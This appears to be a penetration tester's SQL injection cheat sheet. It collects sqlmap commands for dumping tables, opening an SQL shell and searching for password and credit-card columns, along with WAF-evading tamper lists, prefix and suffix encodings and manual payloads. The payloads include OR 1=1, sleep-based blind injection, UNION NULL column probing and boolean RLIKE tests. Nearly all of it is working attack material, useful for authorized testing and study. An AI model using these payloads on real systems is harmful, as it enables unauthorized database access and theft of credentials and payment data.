https://github.com/sqlmapproject/sqlmap/wiki/Usage

Use Prefix and Suffix for more challenging attacks
---------------------------------------------
```
# See example 9 https://pentesterlab.com/exercises/web_for_pentester_II/course
# Example Chinese char set https://www.fileformat.info/info/charset/GBK/list.htm
sqlmap -r ./sqlmap-03.txt --level=5 --risk=3 --batch --prefix=%bf%27 --dbms=mysql
```
Useful Switches
----------------
```
# To see more details on what sqlmap is doing
# v 3 shows the payloads, --no-cast and --no-escape shows "human readable" requests
sqlmap -r ./sqlmap-attack.txt --batch --no-cast --no-escape -v 3

--skip-heuristics   Skip heuristic detection of SQLi/XSS vulnerabilities
--skip-waf          Skip heuristic detection of WAF/IPS protection

Run sqlmap with “–v 4” and “--no-escape” to get example attacks. Mileage may vary. 

--no-cast
--no-escape
–-crawl=4 (depth of pages to crawl)
--proxy=http://127.0.0.1:8080
-–identify-waf
--dbms=mssql|mysql|mysql 4|mysql 5|oracle|pgsql|sqlite|sqlite3|access|firebird|maxdb|sybase|BD2?
--prefix=?????? - see below
--suffix=?????? - see below
-D DatabaseName --search -C password
--search -C password
--search -C credit
--search -C creditcard
--list-tampers
# useful to give example attacks, have to clean up extra junk around results
--v 4 
-v 0-6
--force-ssl
--random-agent
--flush-session

# SQL injection techniques to use.
# Valid: a string composed by B, E, U, S, T and Q where:
# B: Boolean-based blind SQL injection
# E: Error-based SQL injection
# U: UNION query SQL injection
# S: Stacked queries SQL injection
# T: Time-based blind SQL injection
# Q: Inline SQL injection
# Example: ES (means test for error-based and stacked queries SQL
# injection types only)
# Default: BEUSTQ (means test for all SQL injection types - recommended)
tech = BEUSTQ
```

Useful if the dev is filtering/removing single quotes
-------------
```
# delimit ' by escaping with \ this will break the select statement
examples
username=\'&password=mypassword1*#
username=%5C%27&password=password1*%23
```

SQLite sample 
-------------
```
# NOTE: Notice the -D parameter is "SQLite_masterdb", this appears to be the default database for SQLite. 
# Other possible -D parameter could be "main"
sqlmap -r ./sqlmap-01.txt --dbms=SQLite --batch --level=5 --risk=3 -D SQLite_masterdb -T users -C admin,password,username --dump

## Get --sql-shell
sqlmap -r ./sqlmap-01.txt --dbms=SQLite --batch --level=5 --risk=3 -D SQLite_masterdb -T users -C admin,password,username --dump --sql-shell

# List tables
SELECT name FROM sqlite_master WHERE type='table';
SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'

# Show tables and columns
SELECT sql FROM sqlite_master
```

SQLMap Tamper Data
-------------

```
sqlmap --list-tampers
# Very usefull
--tamper=space2comment - Replaces space character (' ') with comments '/**/'

--tamper=charencode - URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %53%45%4C%45%43%54)

--tamper=charunicodeencode - Unicode-URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %u0053%u0045%u004C%u0045%u0043%u0054)
```

```
sqlmap -u 'http://www.site.com:80/search.cmd?form_state=1’ --level=5 --risk=3 -p 'item1' --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
```
General Tamper Data
```
tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
```
MSSQL
```
tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,percentage,randomcase,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
```
MYSQL
```
tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,percentage,randomcase,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
```
SQLInjection Basic Stuff
-------------
```
' or 1=1 --
' or 1=1 or '1'='1
# If single quotes are blocked try delimiting them
/' or 1=1 or '1'='1
/' or 1=1 --
'"
105 OR 1=1
" or ""="
'%2b(select*from(select(sleep(20)))a)%2b'%bf%27
'+(select*from(select(sleep(5)))a)+'
999999 or 1=1 or 1=1
' or 1=1 or '1'='1
" or 1=1 or "1"="1
999999) or 1=1 or (1=1
') or 1=1 or ('1'='1
") or 1=1 or ("1"="1
999999)) or 1=1 or ((1=1
')) or 1=1 or (('1'='1
")) or 1=1 or (("1"="1
999999))) or 1=1 or (((1
'))) or 1=1 or ((('1'='1
"))) or 1=1 or ((("1"="1
(select 99999999 from pg_sleep(15)) as test
(select 99999999 from pg_sleep(15))
9999'||(select 99999999 from pg_sleep(15))||'9999
9999"||(select 99999999 from pg_sleep(15))||"9999
extractvalue('<xml>',concat("/",(select version())))
'%2b(select%2afrom(select(sleep(8)))a)%2b'
%2c(select*from(select(sleep(20)))a)
# change benchmark and check timing
%20PROCEDURE%20ANALYSE(EXTRACTVALUE(5591,CONCAT(0x5c,(BENCHMARK(10000000,MD5(0x79435a55))))),1)
# Compare reposnses, if they differ then most likley injectable  
1+AND+8167=8167
1+AND+8167=8188
```
Interesting items that can be used to prefix and suffix attacks
---------------------
```
https://www.w3schools.com/tags/ref_urlencode.asp

\ = %5c
/ = %2f
' = %27
-- = %2d%2d
# = %23
%0a = inserts a line feed
%00 = inserts a nullbyte

\
/
'
--
#
%0a

# Add this to the end of the parameter, see what happens
%60*

# Handy if the dev is filtering for integer at the end of query
--suffix="=1"
--suffix="1"

prefix='('
prefix='\xBF'''
prefix='%bf%27'
prefix=''''
```

Attack using the middle of the url
----------------------
```bash
sqlmap.py -p host -u "example.com?host=" --prefix "http://anotherexample.com?bar=1" --suffix "&restoftheurl=whatever"
```
Sqlmap quick cheat sheet
-------------
```
sqlmap -u ${url}
sqlmap -u ${url} --dbs
sqlmap -u ${url} -D ${database} --tables
sqlmap -u ${url} -D ${database} -T ${table} --columns
sqlmap -u ${url} -D ${database} -T ${table} -C ${col1},${col2} --dump
```

Manual testing MySQL UNION query (NULL)
---------------------------
```
# Add or subtract NULL's until there are no errors returned. When no errors are retuned this will show the number of columns. 
# If there are 3 columns then this will not return an error (Notice there are 3 NULL's)
player=bill' UNION ALL SELECT CONCAT(0,0,0),NULL,NULL,NULL#
#  When 4 NULL's are added there will be an error. 
player=bill' UNION ALL SELECT CONCAT(0,0,0),NULL,NULL,NULL,NULL#

# Payload for Burp
,NULL
,NULL,NULL
,NULL,NULL,NULL
,NULL,NULL,NULL,NULL
,NULL,NULL,NULL,NULL,NULL
,NULL,NULL,NULL,NULL,NULL,NULL
,NULL,NULL,NULL,NULL,NULL,NULL,NULL
,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
```

Manual testing boolean-based blind
----------------------------
```
# No error returned (3419 = 3419)
bill' RLIKE (SELECT (CASE WHEN (3419=3419) THEN 0x62696c6c ELSE 0x28 END))-- yuiS
# Error returned (3419 does not equal 3400)
bill' RLIKE (SELECT (CASE WHEN (3419=3400) THEN 0x62696c6c ELSE 0x28 END))-- yuiS
```

Manual testing MySQL ORDER BY query
--------------------
```
# Use Burp to loop through number 7 to find the number of columns
player=bill' order by 7#
```
